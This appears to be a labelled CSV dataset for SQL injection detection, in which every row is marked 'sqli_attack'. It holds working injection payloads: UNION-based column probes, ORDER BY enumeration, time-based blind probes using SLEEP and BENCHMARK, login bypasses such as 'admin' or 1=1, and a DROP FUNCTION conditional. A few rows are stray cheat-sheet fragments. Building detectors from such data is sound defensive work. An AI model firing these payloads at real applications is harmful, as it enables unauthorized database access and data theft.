"query","label"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'","sqli_attack"
"'and (select substring(@@version,2,1))='i''","sqli_attack"
"'AND 1083=1083 AND ('1427=1427'","sqli_attack"
"'%' AND 8310=8310 AND '%'=''","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'","sqli_attack"
"'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'","sqli_attack"
"'waitfor delay '00:00:05''","sqli_attack"
"''LIKE''","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#'","sqli_attack"
"'AND 1083=1083 AND (1427=1427'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'","sqli_attack"
"'""""'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'","sqli_attack"
"'""""""""'","sqli_attack"
"'ORDER BY 27'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'","sqli_attack"
"'admin""""or 1=1 or """"""""=""""'","sqli_attack"
"'admin"""" or """"1""""=""""1""""--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'","sqli_attack"
"'');","sqli_attack"
"'ORDER BY 1,SLEEP(5),3,4#'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--'","sqli_attack"
"'1' ORDER BY 1,2--+'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'","sqli_attack"
"'WHERE 1=1 AND 1=1--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#'","sqli_attack"
"'SLEEP(5)#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9'","sqli_attack"
"'"""" or """"""""-""""'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'","sqli_attack"
"'ORDER BY 8--'","sqli_attack"
"'or benchmark(50000000,MD5(1))--'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'","sqli_attack"
"'' AnD SLEEP(5) ANd '1'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11'","sqli_attack"
"'OR 1=0--'","sqli_attack"
"''''''''''''''UNION SELECT '2'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'","sqli_attack"
"'ORDER BY 24--'","sqli_attack"
"''*''","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'","sqli_attack"
"'ORDER BY 30'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'","sqli_attack"
"'OR 1=0'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'","sqli_attack"
"'' UNION SELECT 1,2,3 --'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'","sqli_attack"
"'admin"""" or 1=1/*'","sqli_attack"
"'' OR '1'","sqli_attack"
"'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'","sqli_attack"
"'1' ORDER BY 1,2--+'","sqli_attack"
"'HAVING 1=1--'","sqli_attack"
"'1 or sleep(5)#'","sqli_attack"
"'admin"""" or 1=1/*'","sqli_attack"
"'ORDER BY 16--'","sqli_attack"
"'# Numeric'","sqli_attack"
"'' GROUP BY columnnames having 1=1 --'","sqli_attack"
"'1' ORDER BY 1,2--+'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),""""'3'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#'","sqli_attack"
"'ORDER BY 19--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#'","sqli_attack"
"'ORDER BY 23--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'","sqli_attack"
"'admin"""" or 1=1'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'","sqli_attack"
"'1' ORDER BY 2--+'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'","sqli_attack"
"'AND 1'","sqli_attack"
"'||		(double pipe) concatenate'","sqli_attack"
"'ORDER BY 24'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'","sqli_attack"
"'1 or pg_sleep(5)--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'","sqli_attack"
"'"""") or true--'","sqli_attack"
"'admin') or '1'='1'#'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'","sqli_attack"
"'/'","sqli_attack"
"'') or ('x')=('x'","sqli_attack"
"'ORDER BY 12'","sqli_attack"
"''));","sqli_attack"
"'""""-""""'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8'","sqli_attack"
"'AS INJECTX WHERE 1=1 AND 1=0#'","sqli_attack"
"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'","sqli_attack"
"'ORDER BY 28#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'","sqli_attack"
"'ORDER BY 7#'","sqli_attack"
"'1*56'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))--'","sqli_attack"
"'""""*""""'","sqli_attack"
"'-1 UNION SELECT 1 INTO @,@,@'","sqli_attack"
"'ORDER BY 11#'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#'","sqli_attack"
"'"""") or true--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'","sqli_attack"
"'UNION ALL SELECT NULL#'","sqli_attack"
"''LIKE''","sqli_attack"
"'ORDER BY 27--'","sqli_attack"
"'/*  	C-style comment'","sqli_attack"
"''\""""'","sqli_attack"
"'UNION ALL SELECT 1,2#'","sqli_attack"
"'ORDER BY 29--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--'","sqli_attack"
"'ORDER BY 22#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14'","sqli_attack"
"'AND 7300=7300 AND ('pKlZ'='pKlZ'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#'","sqli_attack"
"'"""";","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'","sqli_attack"
"'UNION ALL SELECT 1'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'","sqli_attack"
"'ORDER BY 28--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'","sqli_attack"
"'ORDER BY 11--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'","sqli_attack"
"'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--'","sqli_attack"
"'' or sleep(5)=''","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#'","sqli_attack"
"'ORDER BY 6'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--'","sqli_attack"
"'WHERE 1=1 AND 1=0#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'","sqli_attack"
"'UNION ALL SELECT 1,2'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--'","sqli_attack"
"'""""*""""'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'admin') or '1'='1'#'","sqli_attack"
"'ORDER BY 1,SLEEP(5),3,4--'","sqli_attack"
"'WHERE 1=1 AND 1=1'","sqli_attack"
"'1 or sleep(5)#'","sqli_attack"
"'ORDER BY 7'","sqli_attack"
"'1 or benchmark(10000000,MD5(1))#'","sqli_attack"
"'ORDER BY 19'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'-1 UNION SELECT 1 INTO @,@,@'","sqli_attack"
"'+benchmark(3200,SHA1(1))+''","sqli_attack"
"'benchmark(50000000,MD5(1))'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--'","sqli_attack"
"'UNION ALL SELECT SLEEP(5)--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'","sqli_attack"
"'"""" """"'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'","sqli_attack"
"'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --'","sqli_attack"
"'ORDER BY 30#'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'","sqli_attack"
"'ORDER BY 28#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8#'","sqli_attack"
"'HAVING 1=1--'","sqli_attack"
"'admin' or 1=1'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'","sqli_attack"
"'HAVING 1=0'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'","sqli_attack"
"'+ SLEEP(10) + ''","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--'","sqli_attack"
"'OR 1=0--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9'","sqli_attack"
"'admin"""") or (""""1""""=""""1""""--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'","sqli_attack"
"'ORDER BY 14#'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4--'","sqli_attack"
"''\""""'","sqli_attack"
"'ORDER BY 9'","sqli_attack"
"'ORDER BY 10'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))'","sqli_attack"
"'ORDER BY 1,SLEEP(5)#'","sqli_attack"
"'UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12'","sqli_attack"
"'' or """"'","sqli_attack"
"'ORDER BY 21'","sqli_attack"
"');","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),3'","sqli_attack"
"'OR 1=1--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'","sqli_attack"
"'"""" or """"""""&""""'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4'","sqli_attack"
"'1 AND (SELECT * FROM Users) = 1'","sqli_attack"
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'","sqli_attack"
"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'","sqli_attack"
"'ORDER BY SLEEP(5)'","sqli_attack"
"'"""" OR """""""" = """"'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'","sqli_attack"
"'`	    Backtick'","sqli_attack"
"'ORDER BY 28--'","sqli_attack"
"'ORDER BY 10#'","sqli_attack"
"'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'","sqli_attack"
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9'","sqli_attack"
"''=0--+'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'","sqli_attack"
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'","sqli_attack"
"'admin"""") or """"1""""=""""1""""--'","sqli_attack"
"'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--'","sqli_attack"
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'","sqli_attack"
"'OR 3409=3409 AND ('pytW' LIKE 'pytY'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--'","sqli_attack"
"'ORDER BY 1,SLEEP(5)#'","sqli_attack"
"'admin"""") or (""""1""""=""""1'","sqli_attack"
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--'","sqli_attack"
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'","sqli_attack"
"'ORDER BY 28#'","sqli_attack"
"'''","sqli_attack"
